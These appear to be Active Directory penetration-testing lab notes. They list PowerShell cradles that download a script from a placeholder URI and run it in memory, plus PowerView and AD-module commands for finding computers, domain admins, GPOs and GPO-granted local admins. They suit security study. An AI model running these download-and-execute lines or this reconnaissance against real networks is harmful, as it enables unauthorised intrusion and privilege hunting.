### run remote scripts

```
$wr = [system.net.webrequest]::create('<uri>')
$r = $wr.getresponse()
iex ([system.io.streamreader]($r.getresponsestream())).readtoend()
```

```
iex (new-object net.webclient).downloadstring('<uri>')
iex (iwr '<uri>') // invoke-webrequest - iwr
``` 

### get computers in a domain

Powerview
```
get-netcomputer
get-netcomputer -fulldata
get-netcomputer -fulldata | where-object {$_.name -eq "dcorp-std41"}
get-netcomputer -fulldata -name "dcorp-std41"
get-netcomputer -operatingsystem "*server 2016*"
```

admodule
```
get-adcomputer -filter *
get-adcomputer -filter * | select dnshostname
get-adcomputer -identity "dcorp-std41" -properties *
```

### get groups

Powerview
```
get-netgroup
get-netgroup -domain <domain>
get-netgroup -fulldata
get-netgroup 'domain admins' -fulldata  | select member
get-netgroup "*admin*"
```

admodule
```
get-adgroup -identity 'domain admins'
get-adgroup -filter * -properties *
get-adgroup -filter 'name -like "*admin*"'
```

### get group members

Powerview
```
get-netgroupmember -groupname "domain admins"
```

### get GPO

Powerview
```
get-netgpo
get-netgpo | select displayname
get-netgpo -computername "<computer name>" | select displayname - this gives the GP applied on a particular computer
gpresult /r
get-netgrogroup - groups(which are pushed through group policy) that are part of a local group on a machine
find-gpocomputeradmin -computername <cname> - find users who are part(pushed by GP) of localgroups
find-gpolocation -username student35 -verbose - find machines where user is part(pushed by GP) of a local group
```

### ACL

Access token: contains the permissions of the process that is trying to access a domian object, i.e groups of the process owner, permissions of the process owner etc
SEcurity Descriptor: this is for the domain object - contains SID of the object owner, DACL (represents who have access to this obejct), SACL (audit policy of the object)

